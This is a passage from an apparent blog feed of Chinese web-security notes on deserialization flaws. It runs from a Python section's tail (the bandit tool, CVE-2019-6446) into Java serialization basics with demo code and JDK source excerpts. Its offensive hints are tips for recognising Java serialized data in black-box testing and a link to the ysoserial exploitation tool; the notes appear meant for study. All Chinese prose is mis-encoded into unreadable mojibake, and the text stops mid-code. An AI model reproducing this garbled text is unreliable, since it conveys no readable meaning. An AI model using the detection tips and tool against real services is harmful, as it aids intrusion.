ååºåˆ—åŒ–æ—¶è°ƒç”¨<br><code>__getstate__()</code> åºåˆ—åŒ–æ—¶è°ƒç”¨</p><p>Pythonä»£ç å®¡è®¡å·¥å…· bandit</p><h1 id="CVEåˆ†æ"><a href="#CVEåˆ†æ" class="headerlink" title="CVEåˆ†æ"></a>CVEåˆ†æ</h1><h2 id="CVE-2019-6446-Numpyååºåˆ—åŒ–å‘½ä»¤æ‰§è¡Œ"><a href="#CVE-2019-6446-Numpyååºåˆ—åŒ–å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="CVE-2019-6446 Numpyååºåˆ—åŒ–å‘½ä»¤æ‰§è¡Œ"></a>CVE-2019-6446 Numpyååºåˆ—åŒ–å‘½ä»¤æ‰§è¡Œ</h2><p><a href="https://www.freebuf.com/vuls/194540.html">https://www.freebuf.com/vuls/194540.html</a></p>]]></content>
      
      
      <categories>
          
          <category> Web Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ååºåˆ—åŒ–æ¼æ´ </tag>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€Webå®‰å…¨ã€‘ååºåˆ—åŒ–æ¼æ´åˆ†æç¬”è®° - ç¬¬äºŒéƒ¨åˆ† Javaååºåˆ—åŒ–åˆ†æ</title>
      <link href="/2024/09/12/WebSecurity/owasptop/javadeserialization/"/>
      <url>/2024/09/12/WebSecurity/owasptop/javadeserialization/</url>
      
        <content type="html"><![CDATA[<p><a href="https://cloud.tencent.com/developer/article/1590955">å‚è€ƒ</a><br><a href="https://paper.seebug.org/312/">https://paper.seebug.org/312/</a></p><h2 id="æ¦‚è¿°"><a href="#æ¦‚è¿°" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h2><p>å…¶å®å’ŒPHPçš„ååºåˆ—åŒ–å·®ä¸å¤šï¼Œæœ¬æ¥æƒ³å†™åœ¨ä¸€èµ·çš„è¿˜æ˜¯åˆ†å¼€äº†,Javaå’ŒPHPæœ€å¤§çš„ä¸åŒæˆ‘æ„Ÿè§‰å°±æ˜¯åˆ©ç”¨çš„è§¦å‘æ–¹å¼ï¼ŒPHPå› ä¸ºæœ‰é­”æœ¯æ–¹æ³•æ‰€ä»¥æ›´å¤šï¼ˆè™½ç„¶ä½†æ˜¯Javaä¹Ÿæœ‰åå°„ï¼‰ã€‚<br>HTTPï¼šå¤šå¹³å°ä¹‹é—´çš„é€šä¿¡ï¼Œç®¡ç†ç­‰<br>RMIï¼šæ˜¯Javaçš„ä¸€ç»„æ‹¥æŠ¤å¼€å‘åˆ†å¸ƒå¼åº”ç”¨ç¨‹åºçš„APIï¼Œå®ç°äº†ä¸åŒæ“ä½œç³»ç»Ÿä¹‹é—´ç¨‹åºçš„æ–¹æ³•è°ƒç”¨ã€‚å€¼å¾—æ³¨æ„çš„æ˜¯ï¼ŒRMIçš„ä¼ è¾“100%åŸºäºååºåˆ—åŒ–ï¼ŒJava RMIçš„é»˜è®¤ç«¯å£æ˜¯1099ç«¯å£ã€‚<br>JMXï¼šJMXæ˜¯ä¸€å¥—æ ‡å‡†çš„ä»£ç†å’ŒæœåŠ¡ï¼Œç”¨æˆ·å¯ä»¥åœ¨ä»»ä½•Javaåº”ç”¨ç¨‹åºä¸­ä½¿ç”¨è¿™äº›ä»£ç†å’ŒæœåŠ¡å®ç°ç®¡ç†,ä¸­é—´ä»¶è½¯ä»¶WebLogicçš„ç®¡ç†é¡µé¢å°±æ˜¯åŸºäºJMXå¼€å‘çš„ï¼Œè€ŒJBossåˆ™æ•´ä¸ªç³»ç»Ÿéƒ½åŸºäºJMXæ„æ¶ã€‚</p><p>åªæœ‰å®ç°äº†Serializableæ¥å£çš„ç±»çš„å¯¹è±¡æ‰å¯ä»¥è¢«åºåˆ—åŒ–ï¼ŒSerializable æ¥å£æ˜¯å¯ç”¨å…¶åºåˆ—åŒ–åŠŸèƒ½çš„æ¥å£ã€‚</p><p>Javaæ¥å£ï¼š Serializable Externalizable æ¥å£ã€fastjsonã€jacksonã€gsonã€ObjectInputStream.readã€ObjectObjectInputStream.readUnsharedã€XMLDecoder.readã€ObjectYaml.loadXStream.fromXMLã€ObjectMapper.readValueã€JSON.parseObject ç­‰</p><p>Javaååºåˆ—åŒ–åçš„æ•°æ®ä¼šæœ‰ä¸€äº›ç‰¹å¾ï¼Œè¿™åœ¨é»‘ç›’æµ‹è¯•ä¸­å¾ˆæœ‰ç”¨ï¼š<br>ä»¥ rO0AB å¼€å¤´ï¼Œå¯ä»¥ç¡®å®šè¿™ä¸²å°±æ˜¯ JAVA åºåˆ—åŒ– base64 åŠ å¯†çš„æ•°æ®ï¼ˆJava åºåˆ—åŒ–åè®®çš„äºŒè¿›åˆ¶æ ‡è¯†ç¬¦ aced 0005ï¼Œæ˜¯ Java åºåˆ—åŒ–åè®®çš„å›ºå®šé­”æœ¯å¤´ï¼‰<br>æˆ–è€…å¦‚æœä»¥ aced å¼€å¤´ï¼Œé‚£ä¹ˆåˆ™å¯èƒ½æ˜¯ java åºåˆ—åŒ–çš„ 16 è¿›åˆ¶ã€‚</p><p>å¯èƒ½ä¼šå‡ºç°çš„åœ°æ–¹ï¼šhttpå‚æ•°ï¼Œcookieï¼Œsesionï¼Œå­˜å‚¨æ–¹å¼å¯èƒ½æ˜¯base64(rO0ï¼‰ï¼Œå‹ç¼©åçš„base64(H4s),MIIç­‰Servlets http,Sockets,Sessionç®¡ç†å™¨ï¼ŒåŒ…å«çš„åè®®å°±åŒ…æ‹¬ï¼šJMX,RMI,JMS,JND1ç­‰(\xac\Xed) xm lXstream,XmldEcoderç­‰ï¼ˆhttp Body:Content-type: application&#x2F;xmlï¼‰json(jackson,fastjson)httpè¯·æ±‚ä¸­åŒ…å«</p><p>åˆ©ç”¨å·¥å…·ï¼š<a href="https://github.com/frohoff/ysoserial%EF%BC%8C%E5%88%A9%E7%94%A8%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%8Chttps://github.com/NickstaDB/SerializationDumper">https://github.com/frohoff/ysoserialï¼Œåˆ©ç”¨åŸç”Ÿç±»çš„ååºåˆ—åŒ–ï¼Œhttps://github.com/NickstaDB/SerializationDumper</a> è¿˜åŸJavaçš„åºåˆ—åŒ–æ•°æ®</p><h2 id="åºåˆ—åŒ–æ¥å£-Serializable"><a href="#åºåˆ—åŒ–æ¥å£-Serializable" class="headerlink" title="åºåˆ—åŒ–æ¥å£ Serializable"></a>åºåˆ—åŒ–æ¥å£ Serializable</h2><p>Java åºåˆ—åŒ–æ˜¯ JDK 1.1 æ—¶å¼•å…¥çš„ä¸€ç»„å¼€åˆ›æ€§çš„ç‰¹æ€§ï¼Œç”¨äºå°† Java å¯¹è±¡è½¬æ¢ä¸ºå­—èŠ‚æ•°ç»„ï¼Œä¾¿äºå­˜å‚¨æˆ–ä¼ è¾“ã€‚æ­¤åï¼Œä»ç„¶å¯ä»¥å°†å­—èŠ‚æ•°ç»„è½¬æ¢å› Java å¯¹è±¡åŸæœ‰çš„çŠ¶æ€ã€‚</p><p>åºåˆ—åŒ–çš„æ€æƒ³æ˜¯â€œå†»ç»“â€å¯¹è±¡çŠ¶æ€ï¼Œç„¶åå†™åˆ°ç£ç›˜æˆ–è€…åœ¨ç½‘ç»œä¸­ä¼ è¾“ï¼›<a href="https://javabetter.cn/io/serialize.html">ååºåˆ—åŒ–</a>çš„æ€æƒ³æ˜¯â€œè§£å†»â€å¯¹è±¡çŠ¶æ€ï¼Œé‡æ–°è·å¾—å¯ç”¨çš„ Java å¯¹è±¡ã€‚</p><p>åºåˆ—åŒ–æœ‰ä¸€æ¡è§„åˆ™ï¼Œå°±æ˜¯è¦åºåˆ—åŒ–çš„å¯¹è±¡å¿…é¡»å®ç° <code>Serializbale</code> æ¥å£ï¼Œå¦åˆ™å°±ä¼šæŠ¥ NotSerializableException å¼‚å¸¸ã€‚</p><p>å¥½ï¼Œæ¥çœ‹çœ‹ <code>Serializbale</code> æ¥å£çš„å®šä¹‰å§ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ²¡åˆ«çš„äº†ï¼</p><p>æ˜æ˜å°±ä¸€ä¸ªç©ºçš„æ¥å£å˜›ï¼Œç«Ÿç„¶èƒ½å¤Ÿä¿è¯å®ç°äº†å®ƒçš„â€œç±»å¯¹è±¡â€è¢«åºåˆ—åŒ–å’Œååºåˆ—åŒ–ï¼Ÿ</p><h3 id="02ã€å†æ¥ç‚¹å®æˆ˜"><a href="#02ã€å†æ¥ç‚¹å®æˆ˜" class="headerlink" title="02ã€å†æ¥ç‚¹å®æˆ˜"></a>02ã€å†æ¥ç‚¹å®æˆ˜</h3><p>åœ¨å›ç­”ä¸Šè¿°é—®é¢˜ä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆæ¥åˆ›å»ºä¸€ä¸ªç±»ï¼ˆåªæœ‰ä¸¤ä¸ªå­—æ®µï¼Œå’Œå¯¹åº”çš„ <code>getter/setter</code>ï¼‰ï¼Œç”¨äºåºåˆ—åŒ–å’Œååºåˆ—åŒ–ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Wanger</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å†æ¥åˆ›å»ºä¸€ä¸ªæµ‹è¯•ç±»ï¼Œé€šè¿‡ <code>ObjectOutputStream</code> å°†â€œ18 å²çš„ç‹äºŒâ€å†™å…¥åˆ°æ–‡ä»¶å½“ä¸­ï¼Œå®é™…ä¸Šå°±æ˜¯ä¸€ç§åºåˆ—åŒ–çš„è¿‡ç¨‹ï¼›å†é€šè¿‡ <code>ObjectInputStream</code> å°†â€œ18 å²çš„ç‹äºŒâ€ä»æ–‡ä»¶ä¸­è¯»å‡ºæ¥ï¼Œå®é™…ä¸Šå°±æ˜¯ä¸€ç§ååºåˆ—åŒ–çš„è¿‡ç¨‹ã€‚ï¼ˆå‰é¢æˆ‘ä»¬å­¦ä¹ <a href="https://javabetter.cn/io/serialize.html">åºåˆ—æµ</a>çš„æ—¶å€™ä¹Ÿè®²è¿‡ï¼‰</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// åˆå§‹åŒ–</span></span><br><span class="line"><span class="type">Wanger</span> <span class="variable">wanger</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Wanger</span>();</span><br><span class="line">wanger.setName(<span class="string">&quot;ç‹äºŒ&quot;</span>);</span><br><span class="line">wanger.setAge(<span class="number">18</span>);</span><br><span class="line">System.out.println(wanger);</span><br><span class="line"></span><br><span class="line"><span class="comment">// æŠŠå¯¹è±¡å†™åˆ°æ–‡ä»¶ä¸­</span></span><br><span class="line"><span class="keyword">try</span> (<span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;chenmo&quot;</span>));)&#123;</span><br><span class="line">    oos.writeObject(wanger);</span><br><span class="line">&#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ä»æ–‡ä»¶ä¸­è¯»å‡ºå¯¹è±¡</span></span><br><span class="line"><span class="keyword">try</span> (<span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;chenmo&quot;</span>)));)&#123;</span><br><span class="line">    <span class="type">Wanger</span> <span class="variable">wanger1</span> <span class="operator">=</span> (Wanger) ois.readObject();</span><br><span class="line">    System.out.println(wanger1);</span><br><span class="line">&#125; <span class="keyword">catch</span> (IOException | ClassNotFoundException e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸è¿‡ï¼Œç”±äº <code>Wanger</code> æ²¡æœ‰å®ç° <code>Serializbale</code> æ¥å£ï¼Œæ‰€ä»¥åœ¨è¿è¡Œæµ‹è¯•ç±»çš„æ—¶å€™ä¼šæŠ›å‡ºå¼‚å¸¸ï¼Œå †æ ˆä¿¡æ¯å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">java.io.NotSerializableException: com.cmower.java_demo.xuliehua.Wanger</span><br><span class="line">at java.io.ObjectOutputStream.writeObject0(ObjectOutputStream.java:1184)</span><br><span class="line">at java.io.ObjectOutputStream.writeObject(ObjectOutputStream.java:348)</span><br><span class="line">at com.cmower.java_demo.xuliehua.Test.main(Test.java:21)</span><br></pre></td></tr></table></figure><p>é¡ºç€å †æ ˆä¿¡æ¯ï¼Œæˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹ <code>ObjectOutputStream</code> çš„ <code>writeObject0()</code> æ–¹æ³•ã€‚å…¶éƒ¨åˆ†æºç å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// åˆ¤æ–­å¯¹è±¡æ˜¯å¦ä¸ºå­—ç¬¦ä¸²ç±»å‹ï¼Œå¦‚æœæ˜¯ï¼Œåˆ™è°ƒç”¨ writeString æ–¹æ³•è¿›è¡Œåºåˆ—åŒ–</span></span><br><span class="line"><span class="keyword">if</span> (obj <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">    writeString((String) obj, unshared);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// åˆ¤æ–­å¯¹è±¡æ˜¯å¦ä¸ºæ•°ç»„ç±»å‹ï¼Œå¦‚æœæ˜¯ï¼Œåˆ™è°ƒç”¨ writeArray æ–¹æ³•è¿›è¡Œåºåˆ—åŒ–</span></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (cl.isArray()) &#123;</span><br><span class="line">    writeArray(obj, desc, unshared);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// åˆ¤æ–­å¯¹è±¡æ˜¯å¦ä¸ºæšä¸¾ç±»å‹ï¼Œå¦‚æœæ˜¯ï¼Œåˆ™è°ƒç”¨ writeEnum æ–¹æ³•è¿›è¡Œåºåˆ—åŒ–</span></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> Enum) &#123;</span><br><span class="line">    writeEnum((Enum&lt;?&gt;) obj, desc, unshared);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// åˆ¤æ–­å¯¹è±¡æ˜¯å¦ä¸ºå¯åºåˆ—åŒ–ç±»å‹ï¼Œå¦‚æœæ˜¯ï¼Œåˆ™è°ƒç”¨ writeOrdinaryObject æ–¹æ³•è¿›è¡Œåºåˆ—åŒ–</span></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> Serializable) &#123;</span><br><span class="line">    writeOrdinaryObject(obj, desc, unshared);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// å¦‚æœå¯¹è±¡ä¸èƒ½è¢«åºåˆ—åŒ–ï¼Œåˆ™æŠ›å‡º NotSerializableException å¼‚å¸¸</span></span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (extendedDebugInfo) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NotSerializableException</span>(</span><br><span class="line">        cl.getName() + <span class="string">&quot;\n&quot;</span> + debugInfoStack.toString());</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NotSerializableException</span>(cl.getName());</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¹Ÿå°±æ˜¯è¯´ï¼Œ<code>ObjectOutputStream</code> åœ¨åºåˆ—åŒ–çš„æ—¶å€™ï¼Œä¼šåˆ¤æ–­è¢«åºåˆ—åŒ–çš„å¯¹è±¡æ˜¯å“ªä¸€ç§ç±»å‹ï¼Œå­—ç¬¦ä¸²ï¼Ÿæ•°ç»„ï¼Ÿæšä¸¾ï¼Ÿè¿˜æ˜¯ <code>Serializable</code>ï¼Œå¦‚æœå…¨éƒ½ä¸æ˜¯çš„è¯ï¼ŒæŠ›å‡º <code>NotSerializableException</code>ã€‚<br>å‡å¦‚ <code>Wanger</code> å®ç°äº† <code>Serializable</code> æ¥å£ï¼Œå°±å¯ä»¥åºåˆ—åŒ–å’Œååºåˆ—åŒ–äº†ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Wanger</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> -<span class="number">2095916884810199532L</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…·ä½“æ€ä¹ˆåºåˆ—åŒ–å‘¢ï¼Ÿ</p><p>ä»¥ <code>ObjectOutputStream</code> ä¸ºä¾‹å§ï¼Œå®ƒåœ¨åºåˆ—åŒ–çš„æ—¶å€™ä¼šä¾æ¬¡è°ƒç”¨ <code>writeObject()</code>â†’<code>writeObject0()</code>â†’<code>writeOrdinaryObject()</code>â†’<code>writeSerialData()</code>â†’<code>invokeWriteObject()</code>â†’<code>defaultWriteFields()</code>ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">defaultWriteFields</span><span class="params">(Object obj, ObjectStreamClass desc)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="comment">// è·å–å¯¹è±¡çš„ç±»ï¼Œå¹¶æ£€æŸ¥æ˜¯å¦å¯ä»¥è¿›è¡Œé»˜è®¤çš„åºåˆ—åŒ–</span></span><br><span class="line">    Class&lt;?&gt; cl = desc.forClass();</span><br><span class="line">    desc.checkDefaultSerialize();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è·å–å¯¹è±¡çš„åŸºæœ¬ç±»å‹å­—æ®µçš„æ•°é‡ï¼Œä»¥åŠè¿™äº›å­—æ®µçš„å€¼</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">primDataSize</span> <span class="operator">=</span> desc.getPrimDataSize();</span><br><span class="line">    desc.getPrimFieldValues(obj, primVals);</span><br><span class="line">    <span class="comment">// å°†åŸºæœ¬ç±»å‹å­—æ®µçš„å€¼å†™å…¥è¾“å‡ºæµ</span></span><br><span class="line">    bout.write(primVals, <span class="number">0</span>, primDataSize, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è·å–å¯¹è±¡çš„éåŸºæœ¬ç±»å‹å­—æ®µçš„å€¼</span></span><br><span class="line">    ObjectStreamField[] fields = desc.getFields(<span class="literal">false</span>);</span><br><span class="line">    Object[] objVals = <span class="keyword">new</span> <span class="title class_">Object</span>[desc.getNumObjFields()];</span><br><span class="line">    <span class="type">int</span> <span class="variable">numPrimFields</span> <span class="operator">=</span> fields.length - objVals.length;</span><br><span class="line">    desc.getObjFieldValues(obj, objVals);</span><br><span class="line">    <span class="comment">// å¾ªç¯å†™å…¥å¯¹è±¡çš„éåŸºæœ¬ç±»å‹å­—æ®µçš„å€¼</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; objVals.length; i++) &#123;</span><br><span class="line">        <span class="comment">// è°ƒç”¨ writeObject0 æ–¹æ³•å°†å¯¹è±¡çš„éåŸºæœ¬ç±»å‹å­—æ®µåºåˆ—åŒ–å†™å…¥è¾“å‡ºæµ</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            writeObject0(objVals[i], fields[numPrimFields + i].isUnshared());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// å¦‚æœåœ¨å†™å…¥è¿‡ç¨‹ä¸­å‡ºç°å¼‚å¸¸ï¼Œåˆ™å°†å¼‚å¸¸åŒ…è£…æˆ IOException æŠ›å‡º</span></span><br><span class="line">        <span class="keyword">catch</span> (IOException ex) &#123;</span><br><span class="line">            <span class="keyword">if</span> (abortIOException == <span class="literal">null</span>) &#123;</span><br><span class="line">                abortIOException = ex;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é‚£æ€ä¹ˆååºåˆ—åŒ–å‘¢ï¼Ÿ</p><p>ä»¥ <code>ObjectInputStream</code> ä¸ºä¾‹ï¼Œå®ƒåœ¨ååºåˆ—åŒ–çš„æ—¶å€™ä¼šä¾æ¬¡è°ƒç”¨ <code>readObject()</code>â†’<code>readObject0()</code>â†’<code>readOrdinaryObject()</code>â†’<code>readSerialData()</code>â†’<code>defaultReadFields()</code>ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">defaultReadFields</span><span class="params">(Object obj, ObjectStreamClass desc)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="comment">// è·å–å¯¹è±¡çš„ç±»ï¼Œå¹¶æ£€æŸ¥å¯¹è±¡æ˜¯å¦å±äºè¯¥ç±»</span></span><br><span class="line">    Class&lt;?&gt; cl = desc.forClass();</span><br><span class="line">    <span class="keyword">if</span> (cl != <span class="literal">null</span> &amp;&amp; obj != <span class="literal">null</span> &amp;&amp; !cl.isInstance(obj)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ClassCastException</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è·å–å¯¹è±¡çš„åŸºæœ¬ç±»å‹å­—æ®µçš„æ•°é‡å’Œå€¼</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">primDataSize</span> <span class="operator">=</span> desc.getPrimDataSize();</span><br><span class="line">    <span class="keyword">if</span> (primVals == <span class="literal">null</span> || primVals.length &lt; primDataSize) &#123;</span><br><span class="line">        primVals = <span class="keyword">new</span> <span class="title class_">byte</span>[primDataSize];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ä»è¾“å…¥æµä¸­è¯»å–åŸºæœ¬ç±»å‹å­—æ®µçš„å€¼ï¼Œå¹¶å­˜å‚¨åœ¨ primVals æ•°ç»„ä¸­</span></span><br><span class="line">    bin.readFully(primVals, <span class="number">0</span>, primDataSize, <span class="literal">false</span>);</span><br><span class="line">    <span class="keyword">if</span> (obj != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="comment">// å°† primVals æ•°ç»„ä¸­çš„åŸºæœ¬ç±»å‹å­—æ®µçš„å€¼è®¾ç½®åˆ°å¯¹è±¡çš„ç›¸åº”å­—æ®µä¸­</span></span><br><span class="line">        desc.setPrimFieldValues(obj, primVals);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è·å–å¯¹è±¡çš„éåŸºæœ¬ç±»å‹å­—æ®µçš„æ•°é‡å’Œå€¼</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">objHandle</span> <span class="operator">=</span> passHandle;</span><br><span class="line">    ObjectStreamField[] fields = desc.getFields(<span class="literal">false</span>);</span><br><span class="line">    Object[] objVals = <span class="keyword">new</span> <span class="title class_">Object</span>[desc.getNumObjFields()];</span><br><span class="line">    <span class="type">int</span> <span class="variable">numPrimFields</span> <span class="operator">=</span> fields.length - objVals.length;</span><br><span class="line">    <span class="comment">// å¾ªç¯è¯»å–å¯¹è±¡çš„éåŸºæœ¬ç±»å‹å­—æ®µçš„å€¼</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; objVals.length; i++) &#123;</span><br><span class="line">        <span class="comment">// è°ƒç”¨ readObject0 æ–¹æ³•è¯»å–å¯¹è±¡çš„éåŸºæœ¬ç±»å‹å­—æ®µçš„å€¼</span></span><br><span class="line">        <span class="type">ObjectStreamField</span> <span class="variable">f</span> <span class="operator">=</span> fields[numPrimFields + i];</span><br><span class="line">        objVals[i] = readObject0(Object.class, f.isUnshared());</span><br><span class="line">        <span class="comment">// å¦‚æœè¯¥å­—æ®µæ˜¯ä¸€ä¸ªå¼•ç”¨å­—æ®µï¼Œåˆ™å°†å…¶æ ‡è®°ä¸ºä¾èµ–è¯¥å¯¹è±¡</span></span><br><span class="line">        <span class="keyword">if</span> (f.getField() != <span class="literal">null</span>) &#123;</span><br><span class="line">            